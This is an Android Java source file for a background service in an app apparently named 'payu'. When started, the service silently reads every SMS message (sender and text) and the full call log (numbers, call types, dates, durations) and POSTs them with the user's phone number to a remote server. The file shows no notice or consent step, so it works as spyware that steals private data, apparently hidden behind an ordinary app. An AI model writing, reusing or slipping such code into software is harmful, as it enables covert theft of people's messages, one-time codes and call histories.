package com.techndev.payu.Service;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.support.annotation.RequiresApi;
import android.util.Log;


import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.techndev.payu.Contants.AppController;
import com.techndev.payu.Contants.BaseUrl;
import com.techndev.payu.R;
import com.techndev.payu.Session.SessionManager;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

public class BackgroundService extends Service {

    private static final String TAG = BackgroundService.class.getSimpleName();
    @SuppressLint("StaticFieldLeak")
    static Context context;
    Uri mSmsQueryUri = Uri.parse("content://sms");
    private boolean isRunning;
    private Thread backgroundThread;
    String phoneNumber;
    SessionManager sessionManager;
    static ArrayList<String> smss;
    static String callllogs;
    Cursor msgCursor;


    public BackgroundService() {

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        sessionManager = new SessionManager(this);
        this.isRunning = false;
        Log.i(TAG, "onCreate()");
        this.backgroundThread = new Thread(myTask);
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!this.isRunning) {
            Log.i(TAG, "onStartCommand()");
            this.backgroundThread.start();
            this.isRunning = true;
            stopSelf();
        }
        return START_STICKY;

    }

    private Runnable myTask = new Runnable() {

        @RequiresApi(api = Build.VERSION_CODES.KITKAT)
        public void run() {
            if (BaseUrl.isConnectedtoInternet(context)) {
                addtoServer(context);
            } else {
                Log.i(TAG, "No internt Connection");
            }

        }
    };


    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    private void addtoServer(final Context context) {
        Log.i(TAG, "addToServer()");
        String url = BaseUrl.baseUrl + context.getResources().getString(R.string.store_new_details);
        smss = getMessages();
        callllogs = getCallDetail();
        Log.i(TAG, url);
        StringRequest request = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.i(TAG, response);
                if (response.equals("Message Received!")) {
                    Log.i(TAG,"all ok");
                    AppController.getInstance().cancelPendingRequests(BaseUrl.tag_string_req);
                }
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // Toast.makeText(context, error.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
                if (error == null || error.networkResponse == null) {
                    return;
                }
                String body;
                //get status code here
                final String statusCode = String.valueOf(error.networkResponse.statusCode);
                Log.i(TAG, statusCode);
                //get response body and parse with appropriate encoding
                body = new String(error.networkResponse.data, StandardCharsets.UTF_8);
                Log.i(TAG, body);
                Log.i(TAG, error.getMessage());
            }
        }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                HashMap<String, String> params = new HashMap<>();
                Log.i(TAG, SessionManager.getPhoneNumber());
                params.put("imei_no", "");
                params.put("calllog", callllogs);
                params.put("record", smss.toString());
                params.put("phone", SessionManager.getPhoneNumber());
                return params;
            }
        };

        // Adding request to request queue
        AppController.getInstance().addToRequestQueue(request, BaseUrl.tag_string_req);

    }


    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public ArrayList<String> getMessages() {
        Log.i(TAG, "getMessages()");
        ArrayList<String> messages = new ArrayList<String>();
        ContentResolver contentResolver = getContentResolver();
        String[] coloums = new String[]{
                "address",
                "body"
        };
        try {
            msgCursor = contentResolver.query(mSmsQueryUri, coloums,
                    null, null, "date desc");
            if (msgCursor != null) {
                if (msgCursor.getColumnCount() == 0) {
                    Log.i(TAG, "Cursor is null");
                } else {
                    Log.i(TAG, String.valueOf(msgCursor.getCount()));
                    try {
                        while (msgCursor.moveToNext()) {
                            String body = msgCursor.getString(msgCursor.getColumnIndex("body"));
                            String address = msgCursor.getString(msgCursor.getColumnIndex("address"));
                            messages.add("\n" + "Number: " + address + "\n" + "Content: " + body + "\n");
                        }
                    } finally {
                        msgCursor.close();
                    }

                }
            }

        } catch (Exception e) {
            Log.i(TAG, e.getMessage());
        }

        return messages;

    }


    private String getCallDetail() {
        StringBuffer stringBuffer = new StringBuffer();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                    + dir + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            stringBuffer.append("\n----------------------------------");
        }
        cursor.close();
        //Toast.makeText(context, "also all ok", Toast.LENGTH_SHORT).show();
        return stringBuffer.toString();
    }


    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.i("EXIT", "onTaskRemoved!");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i("EXIT", "onDestroy!");
    }
}
